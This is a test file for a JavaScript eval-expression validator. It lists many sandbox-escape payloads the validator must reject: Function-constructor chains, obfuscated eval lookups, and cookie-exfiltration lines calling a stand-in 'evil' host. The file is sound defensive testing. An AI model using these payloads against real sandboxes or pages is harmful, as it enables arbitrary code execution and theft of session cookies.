/**
 * Adversarial matrix for the beta.11 P1-1 / P1-2 eval-policy bypasses.
 *
 * P1-1: the AST validator only inspected the OUTERMOST member property, so
 * `('').constructor.constructor('return 1')` slipped through (arbitrary code
 * execution in the page). P1-2: `Reflect.construct` was never rejected, so the
 * network constructors removed from WRITE_APIS (product decision) could be
 * built anyway.
 *
 * Every case is labelled with its acceptance criterion so the auditor can grep
 * AC1/AC2/AC3 straight out of the test names.
 */
import { describe, expect, it } from 'vitest'
import { validateEvalExpression } from '../src/eval-policy.ts'
import { BrowserError } from '../src/errors.ts'

/** Assert that an expression is rejected with a BrowserError code 'eval-policy'. */
function expectEvalPolicyError(expression: string): void {
  let thrown: unknown
  try { validateEvalExpression(expression) } catch (e) { thrown = e }
  expect(thrown, `expected eval-policy rejection for: ${expression}`).toBeInstanceOf(BrowserError)
  expect((thrown as BrowserError).code).toBe('eval-policy')
}

describe('AC1: P1-1 constructor-chain code execution is rejected', () => {
  it.each([
    [`(x=>x).constructor('return 1').call(null)`, 'arrow value .constructor + call'],
    [`('')['constructor']?.['constructor']('return 1').call(null)`, 'string literal + optional chain'],
    [`Reflect.construct(('').constructor, ['return 1'])`, 'Reflect.construct of a constructor'],
    [`('').constructor.constructor('return document.cookie').call(null)`, 'cookie read payload'],
    [`('').constructor.constructor('return fetch("https://evil/?d="+document.cookie)').call(null)`, 'cookie exfil payload'],
    [`({}).__proto__.constructor.constructor('return 1')()`, '__proto__ chain'],
    [`('').constructor.constructor.apply(null, ['return 1'])`, 'apply trampoline'],
    [`('').constructor.constructor.bind(null)('return 1')()`, 'bind trampoline'],
    [`''['con'+'structor']('return 1')`, 'computed-string obfuscation'],
    [`Object.getOwnPropertyDescriptor((()=>{}), 'constructor').value('return 1')`, 'descriptor .value route'],
    [`Object.getOwnPropertyDescriptor((()=>{}), 'con'+'structor').value('return 1')`, 'descriptor + obfuscation'],
    [`(f => f('alert(1)'))(setTimeout)`, 'arrow-parameter alias laundering'],
    [`(e => e('return 1'))(window['eval'])`, 'arrow alias of eval member'],
  ])('AC1 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC2: P1-2 Reflect.construct network construction is rejected', () => {
  it.each([
    [`Reflect.construct(window['WebSocket'], ['wss://evil'])`, 'WebSocket'],
    [`Reflect.construct(window['XMLHttpRequest'], [])`, 'XMLHttpRequest'],
    [`Reflect.construct(window['EventSource'], ['https://evil'])`, 'EventSource'],
    [`Reflect['construct'](window['WebSocket'], ['wss://evil'])`, 'computed member'],
    [`Reflect?.construct(window['WebSocket'], ['wss://evil'])`, 'optional chain'],
    [`(R => R.construct(window['WebSocket'], ['wss://evil']))(Reflect)`, 'arrow alias of Reflect'],
  ])('AC2 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC3: legit reads and network calls stay allowed', () => {
  it.each([
    // network (beta.11 product decision — must NOT regress)
    `fetch('https://example.com')`,
    `fetch('https://example.com', { method: 'POST', body: 'x' })`,
    `navigator.sendBeacon('https://example.com', 'x')`,
    `fetch('https://example.com').then(r => r.text())`,
    `window.postMessage('x', '*')`,
    `fetch('https://example.com/?c=' + document.cookie)`,
    // reads
    `1 + 1`,
    `window.__NEXT_DATA__`,
    `readText('#a')`,
    `localStorage.getItem('t')`,
    `data[key]`,
    `window['__NEXT_DATA__']`,
    `window?.__NEXT_DATA__`,
    `[1,2,3].map(n => n * 2)`,
    `JSON.parse('{}')`,
    `'abc'.toUpperCase()`,
    `document.querySelector('#a').textContent`,
    `window.location.href`,
    `performance.now()`,
    `Date.now()`,
    `Math.max(1, 2)`,
    `(x => x * 2)(21)`,
    `Reflect.has(window, 'WebSocket')`,
    `Reflect.ownKeys({})`,
    `Object.getPrototypeOf({})`,
    `fetch('u').then(r => r.headers.get('x'))`,
  ])('AC3 accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

/**
 * Fix round 2 (FIX-1/FIX-2/FIX-3/FIX-4). The first matrix only covered the
 * *identifier* binding form and the *member-chain* value form, so the same
 * "launder a dangerous function into a harmless name" semantic survived
 * through three other channels:
 *   - FIX-1: destructuring / default / rest parameter patterns
 *   - FIX-2: dangerous values passed as call arguments or object property values
 *   - FIX-4: member chains broken by a dynamic computed key
 * FIX-3 repairs the over-rejection the first attempt introduced (a param name
 * collected from an unrelated arrow scope).
 */
describe('AC1b: FIX-1 binding-form laundering is rejected (destructuring / default / rest)', () => {
  it.each([
    [`(({constructor: c}) => c('return 1'))((x=>x))`, 'ObjectPattern rename of constructor'],
    [`(({constructor: c}) => (({constructor: F}) => [0].map(F('PWNED="yes"')))(c))('')`, 'nested double destructuring (RCE chain)'],
    [`(([f]) => f('alert(1)'))([setTimeout])`, 'ArrayPattern of a dangerous array element'],
    [`((f = setTimeout) => f('1'))()`, 'AssignmentPattern default value'],
    [`((...f) => f('alert(1)'))(setTimeout)`, 'RestElement parameter'],
    [`(({'constructor': c}) => c('return document.cookie'))('')`, 'string-literal pattern key'],
    [`(({['constructor']: c}) => c('return 1'))('')`, 'computed template/literal pattern key'],
    [`(({a: {constructor: c}}) => c('return 1'))({a: (x=>x)})`, 'nested ObjectPattern'],
    [`(({constructor: c = (x=>x)}) => c('return 1'))({})`, 'AssignmentPattern inside ObjectPattern'],
    [`(([f = setTimeout]) => f('1'))([])`, 'AssignmentPattern inside ArrayPattern'],
    [`(({constructor: c}) => [0].map(c('return 1')))('')`, 'destructured alias as a map argument'],
    [`(({constructor: c}) => c('return 1'))(Object.getPrototypeOf((x=>x)))`, 'getPrototypeOf source + destructuring (PLAN AC5 gap)'],
    [`Object.getPrototypeOf('').constructor.constructor('return 1')()`, 'getPrototypeOf chain (PLAN AC5 gap)'],
  ])('AC1b rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC2b: FIX-2 value-position laundering is rejected (callback args / property values)', () => {
  it.each([
    [`['x'].map(setTimeout)`, 'dangerous function as a callback argument'],
    [`[1].forEach(alert)`, 'alert as a callback argument'],
    [`['fetch("https://evil")'].map(setTimeout)`, 'dangerous function executes a payload string'],
    [`[1].map(alert)`, 'map callback laundering'],
    [`Promise.resolve('x').then(setTimeout)`, 'promise continuation laundering'],
    [`({f: setTimeout}).f('1')`, 'object property value laundering'],
    [`({f: alert}).f('pwned')`, 'object property value alert'],
    [`({f: Reflect.get(window, 'open')}).f('https://evil')`, 'reflective getter laundering'],
    [`['x'].filter(setTimeout)`, 'filter callback laundering'],
    [`[setTimeout].map(f => f('alert(1)'))`, 'dangerous array element reaching a callback param'],
    [`[1].map((0, alert))`, 'sequence expression in an argument'],
    [`[1].map([setTimeout][0])`, 'array element as a callback'],
    [`[1].map(({a: setTimeout}).a)`, 'object property as a callback'],
    [`[1].map(((f) => f)(setTimeout))`, 'IIFE-wrapped callback'],
    [`[1].map(x => setTimeout).at(0)('alert(1)')`, 'arrow returning a dangerous value, then called'],
    [`[1].map(x => setTimeout).forEach(f => f('alert(1)'))`, 'arrow return smuggled into an alias call'],
    [`({a: {b: setTimeout}}).a.b('1')`, 'nested object property value'],
    [`[[setTimeout]][0].map(f => f('1'))`, 'nested array element'],
    [`(({a: [c]}) => c('return 1'))({a: [(x=>x)]})`, 'nested pattern binding from an aggregate'],
  ])('AC2b rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC4: FIX-4 dynamic computed member keys no longer truncate the chain', () => {
  it.each([
    [`('')[` + '`constructor`' + `]('return 1')`, 'template-literal computed key'],
    [`('')['con'+'structor']('return 1')`, 'string-concatenation computed key'],
    [`('')['con'+'structor']['con'+'structor']('return 1')`, 'full concatenated chain'],
    [`[0].map(({f: ('')['con'+'structor']['con'+'structor']}).f('PWNED="yes"'))`, 'dynamic key + property value (independent RCE primitive)'],
  ])('AC4 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

/**
 * Fix round 3 (NEW-P0). FIX-4 constant folding was wired into `propertyKeyName()`
 * and the `Reflect.get` branch only, NOT into `memberName()` — the single name
 * resolution entry used by the WRITE_APIS check and the member-chain walk. So
 * the same member chain passed or failed depending only on HOW the key was
 * spelled: `[1].map(window['eval'])` was rejected while
 * `[1].map(window['ev'+'al'])` (value/callback position) was accepted, giving
 * `eval` as a forEach/map callback → arbitrary code execution in the page.
 * These cases MUST fail on the pre-fix code (recorded: 11 ACCEPT / 0 REJECT).
 */
describe('AC4b: NEW-P0 folded computed keys in VALUE position are rejected', () => {
  it.each([
    [`[1].map(window['ev'+'al'])`, 'concatenated key as a callback (eval)'],
    [`["payload"].forEach(window['ev'+'al'])`, 'concatenated key as forEach callback (eval)'],
    [`["alert(1)"].map(window['ev'+'al'])`, 'eval executes an attacker string'],
    [`["fetch(\\"https://evil\\")"].map(window['ev'+'al'])`, 'eval + network egress payload'],
    [`[1].map(window['e'+'v'+'al'])`, 'three-part concatenation'],
    [`[1].map(window['op'+'en'])`, 'folded WRITE_APIS member (open)'],
    [`[1].map(document['wri'+'te'])`, 'folded document.write'],
    [`['k'].forEach(localStorage['set'+'Item'])`, 'folded localStorage.setItem'],
    [`['https://evil'].forEach(location['ass'+'ign'])`, 'folded location.assign'],
    [`[1].map(("")['con'+'structor']['con'+'structor'])`, 'folded constructor chain as a callback'],
    [`[1].map(window['con'+'structor']['con'+'structor'])`, 'folded window.constructor chain'],
    [`[1].map(window?.['ev'+'al'])`, 'optional chain + folded key'],
    [`[1].map((0, window['ev'+'al']))`, 'sequence expression + folded key'],
    [`[1].map([window['ev'+'al']][0])`, 'array element + folded key'],
    ['[1].map(window[`ev${"a"}l`])', 'template-literal key'],
    ['[1].map(("")[`con${"s"}tructor`][`con${"s"}tructor`])', 'template-literal constructor chain'],
  ])('AC4b rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC3d: FIX-4b regression — folded/harmless computed keys still allowed', () => {
  it.each([
    `window['__NEXT'+'_DATA__']`,
    `data[key]`,
    `window[key]`,
    `document['querySel'+'ector']('#a')`,
    `fetch('u', { body: data[key] })`,
    `[1,2].map(n => data[n])`,
    `[1,2].map(n => window['__NEXT'+'_DATA__'])`,
  ])('AC3d accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

/**
 * D-2 (fix round 3): the property-name blacklist is base-agnostic (DECIDED D6),
 * so idioms that REUSE a blacklisted property name are rejected as collateral.
 * Design doc §4.5.1 registers the nine classes; these tests make the claim
 * machine-checked in both directions: the registered classes must stay
 * rejected (a change to ACCEPT means the blacklist was weakened = security
 * regression), and the listed alternatives must stay allowed (a change to
 * REJECT means over-rejection).
 */
describe('D-2: registered collateral rejections (property-name reuse)', () => {
  it.each([
    [`Object.prototype.hasOwnProperty.call({}, 'x')`, '1: call trampoline'],
    [`Array.prototype.slice.call([1,2])`, '2: call trampoline'],
    [`''.constructor.name`, '3: constructor chain'],
    [`[].constructor`, '4: constructor chain'],
    [`[1,2].constructor`, '4: constructor chain (non-empty array)'],
    [`fn.apply(null, [1])`, '5: apply trampoline'],
    [`fn.bind(null)`, '5: bind trampoline'],
    [`Object.getOwnPropertyDescriptor({}, 'x')`, '6: descriptor .value reaches Function'],
    [`x?.constructor`, '7: optional chain does not exempt'],
    [`Object.prototype.toString.call({})`, '8: prototype + call'],
    [`Object.prototype.hasOwnProperty`, '8: prototype'],
    [`({}).__proto__`, '9: __proto__'],
  ])('D-2 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })

  it.each([
    `Object.keys({})`,
    `Array.isArray([])`,
    `Object.getPrototypeOf({})`,
    `JSON.parse('{}')`,
    `[1,2].slice(1)`,
    `Object.freeze({})`,
    `x instanceof Object`,
    `typeof x`,
    `data[key]`,
    `window['__NEXT'+'_DATA__']`,
  ])('D-2 keeps the documented alternative allowed: %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

describe('D-1: shared child-walk refactor keeps every composite value covered', () => {
  it.each([
    [`[1].map(true ? setTimeout : null)`, 'conditional consequent'],
    [`[1].map(false ? null : alert)`, 'conditional alternate'],
    [`[1].map(1 ? setTimeout : 2)`, 'conditional with literal test'],
    [`({f: true ? setTimeout : null}).f('1')`, 'conditional inside a property value'],
    [`({f: true && setTimeout}).f('1')`, 'logical AND'],
    [`({f: setTimeout || null}).f('1')`, 'logical OR'],
    [`[1].map((0, setTimeout))`, 'sequence'],
    [`[1].map([setTimeout][0])`, 'array element'],
    [`[1].map(!setTimeout ? 1 : 2)`, 'unary inside a conditional test'],
  ])('D-1 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })

  it.each([
    `[1].map(true ? (x=>x) : null)`,
    `[1].map(true ? 1 : 2)`,
    `({f: true ? 'a' : 'b'}).f`,
  ])('D-1 accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

describe('AC3b: FIX-3 scoped bindings — legit callback/alias calls stay allowed (regression)', () => {
  it.each([
    `[() => 1].map(f => f())`,
    `[1].map(f => f + 1) + f()`,
    `((fn) => fn(2))((x) => x + 1)`,
    `[1,2].map((x, i) => x + i)`,
    `Object.keys(o).map(k => o[k])`,
    `[() => 1].map((f, i) => f() + i)`,
  ])('AC3b accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

describe('AC3c: FIX-1/FIX-2 regression — legit reads are not over-rejected', () => {
  it.each([
    `data[key]`,
    `fetch('u', { method: 'POST', body: 'x' })`,
    `fetch('u', { body: data[key] })`,
    `Object.entries(window.__NEXT_DATA__).map(([k, v]) => k)`,
    `[...document.querySelectorAll('a')].map(a => a.href)`,
    `({a: 1, b: 'x'}).a`,
    `[1, 2, 3].filter(n => n > 1).map(n => n * 2)`,
    `localStorage.getItem('t')`,
    `headers.get('x')`,
    `Array.from(document.querySelectorAll('a')).length`,
  ])('AC3c accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

/**
 * Fix round 4 (R3-P0). Round 3 wired constant folding into `memberName()`, which
 * closes every key that folds to a constant string. It does NOT close a key that
 * is only computable at RUNTIME (`String.fromCharCode(...)`, `[...].join('')`,
 * `atob(...)`, `.slice()`, …): `memberName()` returns `undefined` ("unverifiable")
 * and every value-position branch treats `undefined` as "not a literal, allow".
 *
 * Measured on HEAD `4d7b12885f` (vm sandbox, real eval, document.cookie seeded):
 *   ["globalThis.PWN=document.cookie"].forEach(window[String.fromCharCode(101,118,97,108)])
 *     -> PWN="SESSION=RESIDUAL-SECRET-999"          (cookie read)
 *   ["fetch('https://evil/?d='+document.cookie)"].forEach(window[["e","v","a","l"].join("")])
 *     -> FETCH:https://evil/?d=SESSION=RESIDUAL-SECRET-999  (exfiltration)
 *
 * Root cause is the `undefined` sentinel: it means "dynamic key" (legit read,
 * `data[key]`) AND "unverifiable key" (must not be trusted in a value position).
 * The fix keeps `undefined` for reads but denies an unverifiable computed key
 * wherever the member VALUE is consumed (callback/argument/property value/…).
 *
 * These cases MUST fail on the pre-fix code (recorded: 34 ACCEPT / 3 REJECT).
 */
describe('AC4c: R3-P0 residual — runtime-computed keys in VALUE position are rejected', () => {
  it.each([
    // the four measured residual payloads
    [`[1].map(window[String.fromCharCode(101,118,97,108)])`, 'fromCharCode key as a callback'],
    [`["globalThis.PWN=document.cookie"].forEach(window[String.fromCharCode(101,118,97,108)])`, 'fromCharCode key + cookie read'],
    [`[1].map(window[["e","v","a","l"].join("")])`, 'Array.join key as a callback'],
    [`["fetch(\\"https://evil/?d=\\"+document.cookie)"].forEach(window[["e","v","a","l"].join("")])`, 'Array.join key + exfiltration'],
    // other runtime key builders (same class: not constant-foldable)
    [`[1].map(window[String.fromCodePoint(101,118,97,108)])`, 'fromCodePoint key'],
    [`[1].map(window[atob('ZXZhbA==')])`, 'atob key'],
    [`[1].map(window[decodeURIComponent('ev%61l')])`, 'decodeURIComponent key'],
    [`[1].map(window['ev'.concat('al')])`, 'String.concat key'],
    [`[1].map(window['xeval'.slice(1)])`, 'slice key'],
    [`[1].map(window['xevalx'.substring(1,5)])`, 'substring key'],
    [`[1].map(window['EVAL'.toLowerCase()])`, 'toLowerCase key'],
    [`[1].map(window['eval'.toUpperCase().toLowerCase()])`, 'case round-trip key'],
    [`[1].map(window['e,v,a,l'.split(',').join('')])`, 'split + join key'],
    [`[1].map(window['eval'.match(/./g).join('')])`, 'match + join key'],
    [`[1].map(window[String.fromCharCode(101)+'val'])`, 'fromCharCode + concatenation'],
    [`[1].map(window[(101).toString(36)+'val'])`, 'numeric toString key'],
    [`[1].map(window[String.raw({raw:['eval']})])`, 'String.raw call key'],
    [`[1].map(window[\`ev\${String.fromCharCode(97)}l\`])`, 'template with a runtime interpolation'],
    [`[1].map(window[['e','v','a','l'].join('')])`, 'Array.join key (bare array)'],
    [`[1].map(window[(['e','v','a','l']).join('')])`, 'Array.join key (parenthesised)'],
    // the same runtime key in every other value position
    [`["p"].forEach(window[String.fromCharCode(101,118,97,108)])`, 'forEach callback'],
    [`[1].filter(window[String.fromCharCode(101,118,97,108)])`, 'filter callback'],
    [`[1].reduce(window[String.fromCharCode(101,118,97,108)])`, 'reduce callback'],
    [`Promise.resolve(1).then(window[String.fromCharCode(101,118,97,108)])`, 'promise continuation'],
    [`[1].map([window[String.fromCharCode(101,118,97,108)]][0])`, 'array element'],
    [`[1].map((0, window[String.fromCharCode(101,118,97,108)]))`, 'sequence expression'],
    [`[1].map(true ? window[String.fromCharCode(101,118,97,108)] : null)`, 'conditional consequent'],
    [`[1].map(window[String.fromCharCode(101,118,97,108)] || null)`, 'logical expression'],
    [`[1].map(x => window[String.fromCharCode(101,118,97,108)]).at(0)('p')`, 'arrow return value'],
    [`Math.max(...[window[String.fromCharCode(101,118,97,108)]])`, 'spread argument'],
    [`[1].map(\`\${window[String.fromCharCode(101,118,97,108)]}\`)`, 'template interpolation'],
    [`[1].map(window[String.fromCharCode(101,118,97,108)].name)`, 'runtime key inside a member chain'],
    [`[1].map(window[["e","v","a","l"].join("")].name)`, 'join key inside a member chain'],
    // dangerous property names reached through a runtime key
    [`["k"].forEach(localStorage[String.fromCharCode(115,101,116,73,116,101,109)])`, 'setItem via runtime key'],
    [`["https://evil"].forEach(location[String.fromCharCode(97,115,115,105,103,110)])`, 'location.assign via runtime key'],
    [`[1].map(document[String.fromCharCode(119,114,105,116,101)])`, 'document.write via runtime key'],
  ])('AC4c rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

/**
 * R3-P0 sibling channels (same "unverifiable computed key" root cause, three
 * non-callback consumers that round 3 left open):
 *   - a computed ObjectPattern KEY (`({[window[k]]: x}) => …`) renames a member;
 *   - a binding-pattern DEFAULT (`((f = window[k]) => …)()`) aliases a member;
 *   - `Reflect.get(obj, k)` hands the member VALUE straight back out.
 * `Reflect.get(o, key)` / `({[key]: 1})` / `(({[key]: x}) => x)(obj)` stay allowed
 * (AC3e) — the denial is keyed on the computed key being a member expression
 * whose own name cannot be resolved, not on computed keys in general.
 */
describe('AC4d: R3-P0 sibling channels — computed pattern keys, pattern defaults, reflective reads', () => {
  it.each([
    [`(({[window[String.fromCharCode(101,118,97,108)]]: x}) => ["p"].forEach(x))(window)`, 'ObjectPattern computed key from a runtime-key member'],
    [`(({[window[["e","v","a","l"].join("")]]: x}) => ["p"].forEach(x))(window)`, 'ObjectPattern computed key from Array.join'],
    [`(({[window['ev'+'al']]: x}) => ["p"].forEach(x))(window)`, 'ObjectPattern computed key from a folded member'],
    [`((f = window[String.fromCharCode(101,118,97,108)]) => ["p"].forEach(f))()`, 'pattern default from a runtime-key member'],
    [`((f = window[["e","v","a","l"].join("")]) => ["p"].forEach(f))()`, 'pattern default from Array.join'],
    [`((f = window['ev'+'al']) => ["p"].forEach(f))()`, 'pattern default from a folded member'],
    [`[1].map(Reflect.get(window, String.fromCharCode(101,118,97,108)))`, 'Reflect.get with a runtime key in value position'],
    [`[1].map(Reflect.get(window, ["e","v","a","l"].join("")))`, 'Reflect.get with an Array.join key in value position'],
    [`[1].map(Reflect.get(window, ...["eval"]))`, 'Reflect.get with a spread literal name'],
    [`[1].map(Reflect.get(window, ...["ev"+"al"]))`, 'Reflect.get with a spread folded name'],
    [`[1].map(Reflect.get(window, ...[String.fromCharCode(101,118,97,108)]))`, 'Reflect.get with a spread runtime name'],
    [`[1].map(window?.[String.fromCharCode(101,118,97,108)])`, 'optional chain + runtime key'],
    [`[1].map(window[({x:'eval'}).x])`, 'runtime key read from an object property'],
    [`[1].map(window[this.k])`, 'runtime key read from `this`'],
    [`[1].map(window[[...['e','v','a','l']].join('')])`, 'runtime key from a spread array join'],
    [`[1].map(window[true ? 'eval' : String.fromCharCode(101,118,97,108)])`, 'runtime key in a conditional branch'],
    [`[1].map(window[(0, String.fromCharCode(101,118,97,108))])`, 'runtime key inside a sequence'],
    [`[1].map(window[Number('1')])`, 'runtime key from a Number() call'],
    [`[1].map(window[String.fromCharCode.call(null,101,118,97,108)])`, 'runtime key via Function.call'],
    [`["p"].forEach(window[[...['e','v','a','l']].join('')])`, 'spread-array join key as a callback'],
  ])('AC4d rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

/**
 * Over-rejection guard for R3-P0. The denied class is exactly "a computed key
 * that is itself a MEMBER EXPRESSION whose name cannot be resolved". Every
 * documented legit dynamic read below stays allowed: plain `data[key]` /
 * `window[key]`, member bases, numeric/parameter keys, computed object keys and
 * destructuring keys built from identifiers, and `Reflect.get(o, key)`.
 */
describe('AC3e: R3-P0 regression — legit dynamic reads and computed keys stay allowed', () => {
  it.each([
    // the AC3 core list (must not regress)
    `data[key]`,
    `window.__NEXT_DATA__`,
    `localStorage.getItem("t")`,
    `fetch("https://x")`,
    `readText("#a")`,
    `[1,2].map(n => n * 2)`,
    `fetch("u").then(r => r.text())`,
    `document.body.innerText`,
    `({a:1})["a"]`,
    `[1,2,3][0]`,
    `[() => 1].map(f => f())`,
    `Object.getPrototypeOf({})`,
    `Reflect.has({},"x")`,
    `[[1]].map(([a]) => a)`,
    // dynamic reads in value position
    `[1].map(data[key])`,
    `[1].map(data[n])`,
    `[1].map(window[key])`,
    `fetch('u', { body: data[key] })`,
    `[1,2].map(n => data[n])`,
    `Object.keys(o).map(k => o[k])`,
    `Object.entries(data).map(([k, v]) => k)`,
    `obj[key].items[0]`,
    `data[key].foo`,
    `data["a"+"b"]`,
    `data[0]`,
    `data[i]`,
    `window[0]`,
    `arr[idx]`,
    `Math.max(...[data[key]])`,
    '[1].map(`${data[key]}`)',
    // computed keys / destructuring built from identifiers
    `({[key]: 1})`,
    `(({[key]: x}) => x)(obj)`,
    `(({[key]: x}) => [1].map(x))(obj)`,
    `((f = data[key]) => f)()`,
    `Reflect.get(o, key)`,
    `[1].map(Reflect.get(o, key))`,
    `((k) => window[k])('__NEXT_DATA__')`,
    `window['__NEXT'+'_DATA__']`,
    `document['querySel'+'ector']('#a')`,
  ])('AC3e accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})
